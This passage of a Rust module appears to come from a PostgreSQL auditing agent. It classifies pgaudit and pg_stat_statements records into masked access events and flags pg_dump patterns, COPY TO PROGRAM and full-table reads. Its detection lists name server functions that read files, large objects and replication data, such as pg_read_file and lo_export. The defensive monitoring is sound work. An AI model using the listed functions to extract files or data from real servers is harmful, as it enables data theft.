//! From pgaudit records and `pg_stat_statements` deltas to masked access
//! events (ADR-0007): who, which objects (normalized names), which action,
//! how many rows, and the signals computed here from the raw text, which
//! never leaves the agent.
//!
//! Signal heuristics (the vocabulary is `classifiers::masking::Signal`):
//! - `signature.pg_dump`: `application_name` is `pg_dump` / `pg_dumpall`
//!   (spoofable, cheap), or one session (one role within one
//!   `pg_stat_statements` poll) copied at least [`DUMP_MIN_RELATIONS`]
//!   distinct whole relations to the client (`COPY … TO STDOUT`), which is
//!   what `pg_dump` does whatever its `application_name`.
//! - `signature.copy_to_file` / `signature.copy_to_program`: `COPY … TO
//!   '<file>'` / `COPY … TO PROGRAM` (server-side export).
//! - `shape.full_table_copy`: `COPY` out of a whole relation, or of a query
//!   without filter, aggregation or small limit.
//! - `shape.full_table_read`: a read (`SELECT`, `TABLE`) without top-level
//!   `WHERE`, `GROUP BY` / aggregate-only list, derived table, and without
//!   a limit or with a limit above [`LARGE_LIMIT`] rows.
//! - `volume.large_result`: more than [`LARGE_ROWS`] rows returned or
//!   affected (one statement with `pgaudit.log_rows`, or one counter
//!   delta).
//!
//! `shape.*` are heuristics and evadable by design (`WHERE true`,
//! `LIMIT 10000` pages); volume × sensitivity in the console is the robust
//! signal.
//!
//! Each pgaudit record is analyzed on its own statement text, and only the
//! statements matching its command tag count (`select 1; copy … to
//! program …` logs two records). A read or write whose objects cannot be
//! told (function bodies, unparsable text) is reported against `*`, never
//! dropped; statements naming only catalogs (`pg_catalog`,
//! `information_schema`, `pg_toast`, the `pg_stat_statements` relations
//! in the extension's schema, unqualified `pg_*` under the rules of
//! `CatalogRule`) are skipped. The statistics relations that hold column
//! values (`pg_stats`, `pg_stats_ext`, `pg_stats_ext_exprs`,
//! `pg_statistic`, `pg_statistic_ext_data`, qualified with `pg_catalog`
//! or unqualified: [`STATISTICS_RELATIONS`], ADR-0048) are not catalogs
//! there: a statement naming one is a read naming it as
//! `pg_catalog.<name>`, always reported, and never the agent's own (it
//! sends none, ADR-0012 obligation 1). Events of the agent's own account
//! are left out only when they come from its `application_name` and client
//! address, carry no signal, and either are one of the connector's own
//! statements that read no relation (exact text: as sent with pgaudit, as
//! `pg_stat_statements` stores it, parameters in place, with
//! `pg_stat_statements`; not charged) or stay within
//! Discovery's row budget per named object and window (`PgOwn`). Any
//! other event of the agent's account on `*` is reported.

use std::collections::{HashMap, HashSet, VecDeque};
use std::time::{Instant, SystemTime};

use databastion_core::audit::own::{ClientSeen, OwnAccount};

use databastion_classifiers::masking::{
    ClientAddr, EventAction, EventObject, EventPrincipal, EventSource, MaskedEvent, Signal,
};
use databastion_classifiers::names::NormalizedName;
use databastion_classifiers::query::{
    AnalyzeOptions, CopyEndpoint, PgItemClass, PgListed, PgScan, QueryAnalysis, RelationName,
    StatementInfo, StatementKind, analyze, pg_scan,
};

use super::records::AuditRecord;
use super::user_code::{CodeUse, UserCodeHandle, Verdict, routine_ddl_command};
use crate::discover::normalize;
use crate::sql;

/// A limit above this many rows reads a whole relation.
pub(crate) const LARGE_LIMIT: u64 = 10_000;
/// Rows above which `volume.large_result` is set. Both thresholds sit just
/// above the agent's own maximum sample (`limits.max_sample_rows` is at
/// most 10 000), so its Discovery statements never carry these signals.
pub(crate) const LARGE_ROWS: u64 = 10_000;
/// Whole relations copied to the client by one session before
/// `signature.pg_dump` is set.
pub(crate) const DUMP_MIN_RELATIONS: usize = 3;
/// Sessions followed for the `pg_dump` pattern (oldest forgotten first).
const MAX_SESSIONS: usize = 4096;
/// Relations remembered per session.
const MAX_SESSION_RELATIONS: usize = 64;

fn analyze_opts(truncated: bool) -> AnalyzeOptions {
    let mut o = AnalyzeOptions::new().truncated(truncated);
    o.large_limit = LARGE_LIMIT + 1;
    o
}

/// What tells a catalog apart in one database, from the probe of
/// `check::prerequisites` (the agent's own session).
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub(crate) struct DbCatalog {
    /// Schema of the `pg_stat_statements` extension, when installed.
    pub(crate) pss_schema: Option<String>,
    /// `pgaudit.log_catalog`, when pgaudit is loaded.
    pub(crate) pgaudit_log_catalog: Option<bool>,
}

/// [`DbCatalog`] per database of the target (a database not listed has
/// no extension schema and an unknown `pgaudit.log_catalog`).
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub(crate) struct Catalogs {
    dbs: HashMap<String, DbCatalog>,
    /// The target's collision probes (ADR-0049 decision 8).
    user_code: UserCodeHandle,
}

impl Catalogs {
    /// The target's collision probes, shared with `check()`.
    pub(crate) fn with_user_code(mut self, user_code: UserCodeHandle) -> Self {
        self.user_code = user_code;
        self
    }

    pub(crate) fn insert(&mut self, database: &str, c: DbCatalog) {
        self.dbs.insert(database.to_owned(), c);
    }

    fn get(&self, database: &str) -> Option<&DbCatalog> {
        self.dbs.get(database)
    }

    /// The `pg_stat_statements` schema of `database`, when installed.
    pub(crate) fn pss_schema(&self, database: &str) -> Option<&str> {
        self.get(database).and_then(|c| c.pss_schema.as_deref())
    }

    /// Whether some database's `pg_stat_statements` schema differs between
    /// `self` and `other` (a database present in only one counts as
    /// differing when it has a schema).
    pub(crate) fn pss_schema_changed(&self, other: &Catalogs) -> bool {
        let schema = |c: &Catalogs, db: &str| c.get(db).and_then(|d| d.pss_schema.clone());
        self.dbs
            .keys()
            .chain(other.dbs.keys())
            .any(|db| schema(self, db) != schema(other, db))
    }

    /// The rule for a statement of `database`. `unqualified_pg`: whether an
    /// unqualified `pg_*` name counts as a catalog without confirmation.
    pub(crate) fn rule<'a>(
        &'a self,
        database: &str,
        unqualified_pg: bool,
        confirmed: &'a HashSet<String>,
    ) -> CatalogRule<'a> {
        CatalogRule {
            pss_schema: self.get(database).and_then(|c| c.pss_schema.as_deref()),
            unqualified_pg,
            confirmed,
        }
    }
}

/// The extension's relations (`pg_stat_statements`: statistics, not
/// application data; the agent's own probes read them).
fn is_pss_relation(name: &str) -> bool {
    matches!(name, "pg_stat_statements" | "pg_stat_statements_info")
}

/// Which relations count as catalogs for one statement.
#[derive(Clone, Copy)]
pub(crate) struct CatalogRule<'a> {
    /// Schema of the `pg_stat_statements` extension in the statement's
    /// database: only its two relations there count, not a
    /// `pg_stat_statements*` name elsewhere (any role with `CREATE` can
    /// make one).
    pss_schema: Option<&'a str>,
    /// An unqualified `pg_*` name is a catalog. With pgaudit and
    /// `pgaudit.log_catalog = off`, statements on catalogs only are not
    /// logged, so an unqualified `pg_*` name in a logged statement is a
    /// catalog only when pgaudit names it in `pg_catalog`
    /// (`confirmed`). `pg_stat_statements` sees no object names: a
    /// residual (README).
    unqualified_pg: bool,
    /// Names pgaudit reported in `pg_catalog` within the statement.
    confirmed: &'a HashSet<String>,
}

fn is_catalog(r: &RelationName, rule: CatalogRule<'_>) -> bool {
    match r.schema.as_deref() {
        Some("pg_catalog" | "information_schema" | "pg_toast") => true,
        Some(s) if s.starts_with("pg_temp_") || s.starts_with("pg_toast_temp_") => true,
        Some(s) => rule.pss_schema == Some(s) && is_pss_relation(&r.name),
        None if is_pss_relation(&r.name) => rule.pss_schema.is_some(),
        None => {
            r.name.starts_with("pg_") && (rule.unqualified_pg || rule.confirmed.contains(&r.name))
        }
    }
}

/// The statistics relations that hold column values (ADR-0048 decision
/// 1): `pg_stats` (`most_common_vals`, `histogram_bounds`,
/// `most_common_elems`), `pg_stats_ext` and `pg_stats_ext_exprs` (the
/// values of extended statistics), and the tables behind them,
/// `pg_statistic` (`stavalues1` to `stavalues5`) and
/// `pg_statistic_ext_data` (`stxdmcv`, `stxdexpr`). All in `pg_catalog`.
pub(crate) const STATISTICS_RELATIONS: &[&str] = &[
    "pg_stats",
    "pg_stats_ext",
    "pg_stats_ext_exprs",
    "pg_statistic",
    "pg_statistic_ext_data",
];

/// The statistics relation `r` names, as `pg_catalog.<name>`: qualified
/// with `pg_catalog`, or unqualified (`pg_catalog` comes first in the
/// search path unless a session lists it later: a relation shadowing it
/// is over-reported, never missed). Compared after the analyzer's
/// identifier folding: a quoted `"PG_STATS"` is another relation, and so
/// is `public.pg_stats`. Never a catalog for the event rules: reads of
/// these are named, always reported and never the agent's own.
fn statistics_relation(r: &RelationName) -> Option<RelationName> {
    if !matches!(r.schema.as_deref(), None | Some("pg_catalog")) {
        return None;
    }
    STATISTICS_RELATIONS
        .iter()
        .find(|n| **n == r.name)
        .map(|n| RelationName {
            schema: Some("pg_catalog".to_owned()),
            name: (*n).to_owned(),
        })
}

/// Whether `r` is a statistics relation as named in events.
fn is_statistics(r: &RelationName) -> bool {
    r.schema.as_deref() == Some("pg_catalog") && STATISTICS_RELATIONS.contains(&r.name.as_str())
}

// ------------------------------------------- statement-text views (ADR-0049)

/// The `pg_catalog` view of the core list (decision 1): other sessions'
/// current or last statement texts, in its `query` column.
pub(crate) const ACTIVITY_VIEW: &str = "pg_stat_activity";
/// The set-returning function behind [`ACTIVITY_VIEW`] (`query` column).
pub(crate) const ACTIVITY_FUNCTION: &str = "pg_stat_get_activity";
/// The scalar function that returns one backend's statement text.
pub(crate) const BACKEND_ACTIVITY_FUNCTION: &str = "pg_stat_get_backend_activity";
/// The view and function of the `pg_stat_statements` extension (core
/// list), in the extension's schema of the database.
pub(crate) const PSS_VIEW: &str = "pg_stat_statements";
/// The column of the core list that holds statement text.
pub(crate) const TEXT_COLUMN: &str = "query";

/// The extension list of decision 1 (security review M3): names of
/// relations or functions that hold statement texts, plans or predicate
/// constants, in any schema or unqualified, with no shape exemption.
pub(crate) const EXTENSION_TEXT_NAMES: [&str; 3] =
    ["pg_stat_monitor", "pg_store_plans", "pg_show_plans"];
/// Prefix of the extension list (`pg_qualstats`, `pg_qualstats_all`,
/// `pg_qualstats_pretty`, `pg_qualstats_example_query`…).
pub(crate) const EXTENSION_TEXT_PREFIX: &str = "pg_qualstats";

/// The `pg_catalog` functions of decision 7: they run SQL text or read a
/// relation named by their argument, server files (logs hold statement
/// texts), decoded rows of a replication slot, or large objects. A call
/// adds `*` to the statement, also next to catalogs only.
///
/// `pg_read_file_old` (the pre-11 C entry point of `pg_read_file`, still in
/// `pg_catalog` on PostgreSQL 14 to 16, removed in 17, superuser only) is found by the
/// decision 9 drift test and added (refinement of 2026-10-11).
pub(crate) const DATA_FUNCTIONS: [&str; 21] = [
    "query_to_xml",
    "query_to_xmlschema",
    "query_to_xml_and_xmlschema",
    "cursor_to_xml",
    "cursor_to_xmlschema",
    "table_to_xml",
    "table_to_xmlschema",
    "table_to_xml_and_xmlschema",
    "ts_stat",
    "ts_rewrite",
    "pg_read_file",
    "pg_read_file_old",
    "pg_read_binary_file",
    "pg_logical_slot_get_changes",
    "pg_logical_slot_peek_changes",
    "pg_logical_slot_get_binary_changes",
    "pg_logical_slot_peek_binary_changes",
    "lo_get",
    "loread",
    "lo_export",
    "lo_import",
];
/// Prefixes of decision 7 (`schema_to_xml*`, `database_to_xml*`).
pub(crate) const DATA_FUNCTION_PREFIXES: [&str; 2] = ["schema_to_xml", "database_to_xml"];

/// A `pg_catalog` function of decision 7, called qualified with
/// `pg_catalog` or unqualified. A function of that name in another schema
/// is a user function (decision 8, not this list).
fn data_function(r: &RelationName) -> bool {
    matches!(r.schema.as_deref(), None | Some("pg_catalog"))
        && (DATA_FUNCTIONS.contains(&r.name.as_str())
            || DATA_FUNCTION_PREFIXES.iter().any(|p| r.name.starts_with(p)))
}

/// Whether `name` is on the extension list.
fn extension_text_name(name: &str) -> bool {
    EXTENSION_TEXT_NAMES.contains(&name) || name.starts_with(EXTENSION_TEXT_PREFIX)
}

/// What a name of the statement-text lists is.
#[derive(Debug, Clone, PartialEq, Eq)]
enum Listed {
    /// Core list: the object named in events, and the shape rule.
    Core(RelationName, PgListed),
    /// Extension list relation: named as the text gives it, no shape
    /// exemption.
    Extension(RelationName),
    /// A call that names no relation of the lists: `*` (an extension-list
    /// function, or an unqualified `pg_stat_statements(` where the
    /// extension is not installed: a user function).
    Star,
}

/// The core-list object of `pg_stat_activity` and its functions.
fn activity_object() -> RelationName {
    RelationName {
        schema: Some("pg_catalog".to_owned()),
        name: ACTIVITY_VIEW.to_owned(),
    }
}

/// Places `r` (`call`: followed by `(`) on the lists of decision 1, in a
/// database whose `pg_stat_statements` schema is `pss_schema`. Names are
/// compared after the analyzer's folding: a quoted `"PG_STAT_ACTIVITY"`,
/// a `public.pg_stat_activity` or a `pg_stat_statements` outside the
/// extension's schema is not listed (an ordinary relation, or a user
/// function).
fn listed(r: &RelationName, call: bool, pss_schema: Option<&str>) -> Option<Listed> {
    let catalog = matches!(r.schema.as_deref(), None | Some("pg_catalog"));
    match (r.name.as_str(), call) {
        (ACTIVITY_VIEW, false) if catalog => Some(Listed::Core(activity_object(), PgListed::View)),
        (ACTIVITY_FUNCTION, true) if catalog => {
            Some(Listed::Core(activity_object(), PgListed::SetFunction))
        }
        (BACKEND_ACTIVITY_FUNCTION, true) if catalog => {
            Some(Listed::Core(activity_object(), PgListed::Always))
        }
        (PSS_VIEW, _) => {
            let in_extension = match (r.schema.as_deref(), pss_schema) {
                (Some(s), Some(p)) => s == p,
                (None, Some(_)) => true,
                (_, None) => false,
            };
            if in_extension {
                let object = RelationName {
                    schema: pss_schema.map(str::to_owned),
                    name: PSS_VIEW.to_owned(),
                };
                let kind = if call {
                    PgListed::SetFunction
                } else {
                    PgListed::View
                };
                Some(Listed::Core(object, kind))
            } else if call && r.schema.is_none() {
                Some(Listed::Star)
            } else {
                None
            }
        }
        (n, false) if extension_text_name(n) => Some(Listed::Extension(r.clone())),
        (n, true) if extension_text_name(n) => Some(Listed::Star),
        _ => None,
    }
}

/// What a statement text reads of the statement-text lists (ADR-0049
/// decisions 1, 2 and 7), decided on the whole text.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub(crate) struct TextReads {
    /// Listed objects read with their text (core list outside the no-text
    /// shape, extension list): named in the event, always reported.
    pub(crate) objects: Vec<RelationName>,
    /// `*`: a call of decision 7, of an extension-list function, or of an
    /// unqualified `pg_stat_statements(` without the extension.
    pub(crate) star: bool,
    /// Core-list objects the text names (in the no-text shape or not).
    pub(crate) named: Vec<RelationName>,
    /// ADR-0049 decision 8: whether every relation the text names is a
    /// catalog, and the code it uses (decided against the database's
    /// collision probe when the event is built).
    pub(crate) code: CodeUse,
    /// The text creates, alters or drops a function, operator, type,
    /// domain, cast or extension (or drops with `CASCADE`): the collision
    /// probe of its database is stale.
    pub(crate) routine_ddl: bool,
    /// Set by the `pg_stat_statements` poller: the stored text is exactly
    /// one of the connector's statements, in a slot of the agent's role
    /// (its role, top level, a declared database).
    pub(crate) own_connector: bool,
}

fn push_unique(v: &mut Vec<RelationName>, r: RelationName) {
    if !v.contains(&r) {
        v.push(r);
    }
}

/// [`TextReads`] of `text`, analyzed as `analysis`, in a statement of the
/// database `rule` describes. `cut`: the text may be cut at its source's
/// bound. Only names are kept, never a literal (I2).
pub(crate) fn text_reads(
    text: &str,
    analysis: &QueryAnalysis,
    rule: CatalogRule<'_>,
    cut: bool,
) -> TextReads {
    let mut out = TextReads::default();
    let scan = pg_scan(text);
    out.code = code_use(analysis, rule, cut, scan.as_ref());
    let Some(scan) = scan else {
        return out;
    };
    out.routine_ddl = scan.routine_ddl();
    let mut core: Vec<RelationName> = Vec::new();
    for u in scan.names() {
        if u.call && data_function(&u.name) {
            out.star = true;
        }
        match listed(&u.name, u.call, rule.pss_schema) {
            Some(Listed::Core(o, _)) => push_unique(&mut core, o),
            Some(Listed::Extension(o)) => push_unique(&mut out.objects, o),
            Some(Listed::Star) => out.star = true,
            None => {}
        }
    }
    if core.is_empty() {
        return out;
    }
    // The no-text shape (decision 2): a complete text below the relation
    // bound, naming only catalogs and core-list entries, with no access to
    // `query` that the scan cannot rule out.
    let classify = |r: &RelationName, call: bool| match listed(r, call, rule.pss_schema) {
        Some(Listed::Core(_, kind)) => PgItemClass::Listed(kind),
        Some(Listed::Extension(_) | Listed::Star) => PgItemClass::Listed(PgListed::Always),
        None if call => {
            if r.schema.as_deref() == Some("pg_catalog") {
                PgItemClass::Catalog
            } else {
                PgItemClass::Other
            }
        }
        None if is_catalog(r, rule) && statistics_relation(r).is_none() => PgItemClass::Catalog,
        None => PgItemClass::Other,
    };
    let only_catalogs = analysis.parts().iter().all(|p| {
        !p.relations_full
            && p.relations.iter().all(|r| {
                matches!(listed(r, false, rule.pss_schema), Some(Listed::Core(..)))
                    || (is_catalog(r, rule) && statistics_relation(r).is_none())
            })
    });
    // A schema-qualified call of a function outside `pg_catalog` and
    // outside the lists of decisions 1 and 7 (a user function can read the
    // text column without the text naming it): a text read until decision
    // 8 (part 2) reports user functions next to catalogs (security review
    // M1). Unqualified calls are left to decision 8.
    let user_call = scan.names().iter().any(|u| {
        u.call
            && u.name.schema.as_deref().is_some_and(|s| s != "pg_catalog")
            && listed(&u.name, true, rule.pss_schema).is_none()
            && !data_function(&u.name)
    });
    let quiet = !cut
        && !user_call
        && analysis.lexed()
        && only_catalogs
        && scan.no_text_shape(TEXT_COLUMN, &classify);
    if !quiet {
        for o in &core {
            push_unique(&mut out.objects, o.clone());
        }
    }
    out.named = core;
    out
}

/// ADR-0049 decision 8: a text that lexed and names at least one relation,
/// every one a catalog (the statistics relations of ADR-0048 are not) or a
/// core-list entry of decision 1, below the analyzer's relation bound: its
/// code is judged when the event is built, whatever its statements are (a
/// query, or one that wraps a query: `EXPLAIN`, `PREPARE … AS`, `DECLARE …
/// CURSOR FOR`, `CREATE … AS`; any other statement is scanned whole: fail
/// closed, security review of #211, H1). A text that names no relation is
/// already a read of `*`.
fn code_use(
    analysis: &QueryAnalysis,
    rule: CatalogRule<'_>,
    cut: bool,
    scan: Option<&PgScan>,
) -> CodeUse {
    let parts = analysis.parts();
    let named = parts.iter().any(|p| !p.relations.is_empty());
    let catalogs = parts.iter().all(|p| {
        !p.relations_full
            && p.relations.iter().all(|r| {
                matches!(listed(r, false, rule.pss_schema), Some(Listed::Core(..)))
                    || (is_catalog(r, rule) && statistics_relation(r).is_none())
            })
    });
    if !(analysis.lexed() && named && catalogs) {
        return CodeUse::NotApplicable;
    }
    CodeUse::CatalogOnly {
        code: scan.map(|s| std::sync::Arc::new(s.code())),
        cut,
    }
}

/// ADR-0049 decision 8, when the event is built (every action class):
/// whether the catalog-only statement `reads` describes runs user code in
/// `database` (`*`, always reported, never the agent's own). The functions
/// of decisions 1 and 7 are left to those decisions (re-review N4).
/// `own_exact`: the statement is exactly one of the connector's own, from
/// the agent's identity, asked only for a parameter in a database with a
/// user domain whose `CHECK` runs non-C code (security review of #211,
/// M1).
fn user_code_star(
    reads: &TextReads,
    catalogs: &Catalogs,
    database: &str,
    rule: CatalogRule<'_>,
    own_exact: &dyn Fn() -> bool,
) -> bool {
    let CodeUse::CatalogOnly { code, cut } = &reads.code else {
        return false;
    };
    let excluded = |r: &RelationName| decided_elsewhere(r, rule.pss_schema);
    match catalogs
        .user_code
        .decide(database, code.as_deref(), *cut, &excluded)
    {
        Verdict::BuiltIn => false,
        Verdict::UserCode => true,
        Verdict::ParamDomain => !own_exact(),
    }
}

/// A call left to ADR-0049 decisions 1 and 7, not to decision 8
/// (re-review N4): a function of the statement-text lists, or of decision
/// 7.
pub(crate) fn decided_elsewhere(r: &RelationName, pss_schema: Option<&str>) -> bool {
    listed(r, true, pss_schema).is_some() || data_function(r)
}

/// Whether `r` (a relation, from the analysis or a pgaudit record) is a
/// relation of the lists, which [`text_reads`] and the relation-record
/// rule name instead of the catalog rule.
fn listed_relation(r: &RelationName, rule: CatalogRule<'_>) -> bool {
    matches!(
        listed(r, false, rule.pss_schema),
        Some(Listed::Core(..) | Listed::Extension(_))
    )
}

/// Splits a pgaudit object name (`schema.table`, parts possibly quoted).
fn split_object_name(raw: &str) -> Option<RelationName> {
    let mut parts: Vec<String> = Vec::new();
    let mut cur = String::new();
    let mut quoted = false;
    let mut chars = raw.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '"' if quoted && chars.peek() == Some(&'"') => {
                chars.next();
                cur.push('"');
            }
            '"' => quoted = !quoted,
            '.' if !quoted => parts.push(std::mem::take(&mut cur)),
            _ => cur.push(c),
        }
    }
    if quoted {
        return None;
    }
    parts.push(cur);
    if parts.iter().any(String::is_empty) || parts.len() > 3 {
        return None;
    }
    let name = parts.pop()?;
    Some(RelationName {
        schema: parts.pop(),
        name,
    })
}

fn object(database: &str, r: &RelationName) -> EventObject {
    EventObject::new(
        normalize(database),
        r.schema.as_deref().map(normalize),
        normalize(&r.name),
    )
}

/// An object the source does not name: the database, and `*`.
fn unknown_object(database: &str) -> EventObject {
    EventObject::new(normalize(database), None, NormalizedName::wildcard())
}

/// pgaudit object types that hold rows.
fn is_relation_type(t: &str) -> bool {
    matches!(
        t,
        "TABLE" | "VIEW" | "MATERIALIZED VIEW" | "FOREIGN TABLE" | "PARTITIONED TABLE"
    )
}

fn is_dump_application(app: &str) -> bool {
    matches!(app.trim(), "pg_dump" | "pg_dumpall")
}

/// Statement kinds a pgaudit command tag can stand for.
fn kinds_of(command: &str) -> &'static [StatementKind] {
    match command {
        "SELECT" => &[
            StatementKind::Select,
            StatementKind::Table,
            StatementKind::Values,
        ],
        "COPY" => &[StatementKind::Copy],
        "INSERT" => &[StatementKind::Insert],
        "UPDATE" => &[StatementKind::Update],
        "DELETE" => &[StatementKind::Delete],
        "MERGE" => &[StatementKind::Merge],
        _ => &[],
    }
}

/// The statements of `a` a record with `command` is about: those of the
/// matching kind (a `DO` body included); every statement when none
/// matches (the text does not settle it).
fn matching<'a>(a: &'a QueryAnalysis, command: Option<&str>) -> Vec<&'a StatementInfo> {
    let kinds = command.map_or(&[][..], kinds_of);
    let m: Vec<&StatementInfo> = a
        .parts()
        .iter()
        .filter(|p| kinds.contains(&p.kind))
        .collect();
    if m.is_empty() {
        a.parts().iter().collect()
    } else {
        m
    }
}

/// Relations named by `parts`, catalogs excluded but the statistics
/// relations (as `pg_catalog.<name>`, ADR-0048); the flag says whether
/// any relation (catalogs included) was named.
fn user_relations(parts: &[&StatementInfo], rule: CatalogRule<'_>) -> (Vec<RelationName>, bool) {
    let mut out = Vec::new();
    let mut any = false;
    for p in parts {
        for r in &p.relations {
            any = true;
            if listed_relation(r, rule) {
                // Named by `text_reads` when read with their text
                // (ADR-0049), catalogs otherwise.
                continue;
            }
            let r = match statistics_relation(r) {
                Some(s) => s,
                None if is_catalog(r, rule) => continue,
                None => r.clone(),
            };
            if !out.contains(&r) {
                out.push(r);
            }
        }
    }
    (out, any)
}

/// Signals of statements from their analysis (not the session pattern).
fn statement_signals(
    parts: &[&StatementInfo],
    rows: Option<u64>,
    rule: CatalogRule<'_>,
) -> Vec<Signal> {
    let mut out = Vec::new();
    for p in parts {
        if let Some(c) = p.copy
            && c.to
        {
            match c.endpoint {
                CopyEndpoint::File => out.push(Signal::CopyToFile),
                CopyEndpoint::Program => out.push(Signal::CopyToProgram),
                CopyEndpoint::Client | CopyEndpoint::Unknown => {}
            }
            if c.whole_relation {
                out.push(Signal::FullTableCopy);
            }
        }
        if p.kind.is_read()
            && p.relations
                .iter()
                .any(|r| !is_catalog(r, rule) && !listed_relation(r, rule))
            && p.shape.is_some_and(|s| s.whole_relation(LARGE_LIMIT + 1))
        {
            out.push(Signal::FullTableRead);
        }
    }
    if rows.is_some_and(|r| r > LARGE_ROWS) {
        out.push(Signal::LargeResult);
    }
    out
}

/// Relations a statement copies whole to the client.
fn copied_to_client(parts: &[&StatementInfo], rule: CatalogRule<'_>) -> Vec<RelationName> {
    let mut out = Vec::new();
    for p in parts {
        if p.copy
            .is_some_and(|c| c.to && c.whole_relation && c.endpoint == CopyEndpoint::Client)
        {
            out.extend(
                p.relations
                    .iter()
                    .filter(|r| !is_catalog(r, rule) && !listed_relation(r, rule))
                    .cloned(),
            );
        }
    }
    out
}

/// Sessions seen copying whole relations to the client.
#[derive(Default)]
pub(crate) struct DumpTracker {
    sessions: HashMap<String, HashSet<RelationName>>,
    order: VecDeque<String>,
}

impl DumpTracker {
    /// Records the relations a statement of `session` copied whole to the
    /// client; `true` once the session reached [`DUMP_MIN_RELATIONS`].
    pub(crate) fn copied(&mut self, session: &str, relations: &[RelationName]) -> bool {
        if !self.sessions.contains_key(session) {
            if self.sessions.len() >= MAX_SESSIONS
                && let Some(old) = self.order.pop_front()
            {
                self.sessions.remove(&old);
            }
            self.order.push_back(session.to_owned());
            self.sessions.insert(session.to_owned(), HashSet::new());
        }
        let Some(set) = self.sessions.get_mut(session) else {
            return false;
        };
        for r in relations {
            if set.len() < MAX_SESSION_RELATIONS {
                set.insert(r.clone());
            }
        }
        set.len() >= DUMP_MIN_RELATIONS
    }
}

/// Most statements registered at run time ([`PgOwn::allow_text_query`]).
const OWN_MAX_EXTRA_STATEMENTS: usize = 8;

/// The connector's `pg_stat_statements` text queries (`sql::pss_texts`,
/// whose schema is only known at run time) registered for a target. Kept
/// per target by the connector (`CheckState`), like the row budget, so
/// that a pgaudit stream started after a `pg_stat_statements` period
/// recognizes them in the records of that period ([`PssPeriods`]). Not
/// persisted.
pub(crate) type SharedOwnStatements = std::sync::Arc<std::sync::Mutex<Vec<String>>>;

/// Most closed `pg_stat_statements` periods remembered per target.
const MAX_PSS_PERIODS: usize = 16;

/// Taken off the end of a closed `pg_stat_statements` period (security
/// review L2): pgaudit record times are the server's log clock, compared
/// with the agent's clock, and a server clock behind the agent's would
/// otherwise widen the window after the stream stopped by the skew. A
/// skew up to this tolerance is absorbed; a server clock ahead of the
/// agent's (or a skew beyond it in the other direction) makes the
/// agent's last polls reported, never more of the log quiet. The start
/// has no margin: a skew there reports loudly too.
pub(crate) const PSS_PERIOD_SKEW: std::time::Duration = std::time::Duration::from_secs(5);

/// When the target's `pg_stat_statements` stream ran (ADR-0049 decision
/// 5): the pgaudit records of the connector's text query are its own only
/// within one of these periods. In memory only, bounded: after an agent
/// restart no period is known, and the agent's earlier polls found in the
/// log are reported.
#[derive(Debug, Default)]
pub(crate) struct PssPeriods {
    /// Start of the running stream.
    open: Option<SystemTime>,
    /// Closed periods (start, end plus the statement timeout).
    closed: VecDeque<(SystemTime, SystemTime)>,
}

impl PssPeriods {
    /// A `pg_stat_statements` stream of the target started.
    pub(crate) fn start(&mut self, now: SystemTime) {
        if self.open.is_none() {
            self.open = Some(now);
        }
    }

    /// The stream stopped at `now`; its last statement may run up to
    /// `timeout` longer. The end is shortened by [`PSS_PERIOD_SKEW`]
    /// (never before the start).
    pub(crate) fn stop(&mut self, now: SystemTime, timeout: std::time::Duration) {
        if let Some(start) = self.open.take() {
            if self.closed.len() >= MAX_PSS_PERIODS {
                self.closed.pop_front();
            }
            let end = (now + timeout)
                .checked_sub(PSS_PERIOD_SKEW)
                .map_or(start, |e| e.max(start));
            self.closed.push_back((start, end));
        }
    }

    /// Whether `ts` falls within a period.
    pub(crate) fn covers(&self, ts: SystemTime) -> bool {
        self.open.is_some_and(|s| ts >= s) || self.closed.iter().any(|(a, b)| ts >= *a && ts <= *b)
    }
}

/// [`PssPeriods`] shared by the streams of one target.
pub(crate) type SharedPssPeriods = std::sync::Arc<std::sync::Mutex<PssPeriods>>;

/// Marks a `pg_stat_statements` period of a target from its creation to its
/// drop (held by the poller).
pub(crate) struct PssPeriodGuard {
    periods: SharedPssPeriods,
    timeout: std::time::Duration,
}

impl PssPeriodGuard {
    pub(crate) fn start(periods: SharedPssPeriods, timeout: std::time::Duration) -> Self {
        periods
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner)
            .start(SystemTime::now());
        Self { periods, timeout }
    }
}

impl Drop for PssPeriodGuard {
    fn drop(&mut self) {
        self.periods
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner)
            .stop(SystemTime::now(), self.timeout);
    }
}

/// What an event of the agent's account is about, for [`PgOwn`].
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum OwnKind {
    /// One of the connector's own statements that read no relation.
    Tableless,
    /// The connector's own `pg_stat_statements` text query, matched by
    /// exact text (ADR-0049 decision 5): left out uncharged.
    StatementText,
    /// A read or write whose objects the source does not tell (`*`).
    Unknown,
    /// Never the agent's own: a statistics relation (ADR-0048 decision 4,
    /// ADR-0012 obligation 1), any other read of the statement-text lists,
    /// or a function of ADR-0049 decision 7.
    Never,
    /// Named relations.
    Named,
}

/// The text `pg_stat_statements` stores for one of the connector's own
/// statements: every constant (string, integer, `true` / `false`)
/// replaced by `$n`, numbered in order of appearance after the highest
/// bound parameter of the statement, everything else verbatim (as
/// PostgreSQL's `generate_normalized_query` does; checked on PostgreSQL
/// 16). The connector's bound parameters stay `$1`, `$2`… in place: a
/// client sending the same statement with constants instead of parameters
/// gets another `queryid` and another text, and is reported (#76 review
/// I2).
///
/// The text alone does not prove the statement is the connector's: a
/// client can prepare this exact text with every constant bound as a
/// parameter, which gets another `queryid` and the same stored text. The
/// `pg_stat_statements` poller therefore also pins, per own statement, the
/// entry's `queryid` first seen with that text, only in the slots the
/// connector itself uses (the agent's role, top level, a database where
/// it runs that statement), and treats anything else with the same text
/// as not the connector's (`audit::pss`, PR #90 review Low-1).
///
/// Only for the connector's own texts (a closed list): `None` on anything
/// they never hold (a comment, an escape, bit or dollar-quoted string, a
/// non-integer number), so such a text never matches.
fn pss_form(text: &str) -> Option<String> {
    let b = text.as_bytes();
    let ident = |c: u8| c.is_ascii_alphanumeric() || c == b'_' || c == b'$';
    // Highest bound parameter.
    let mut highest = 0u32;
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'$' && b.get(i + 1).is_some_and(u8::is_ascii_digit) {
            let from = i + 1;
            i = from;
            while i < b.len() && b[i].is_ascii_digit() {
                i += 1;
            }
            highest = highest.max(text[from..i].parse().ok()?);
        } else {
            i += 1;
        }
    }
    let mut next = highest;
    let mut constant = |out: &mut String| {
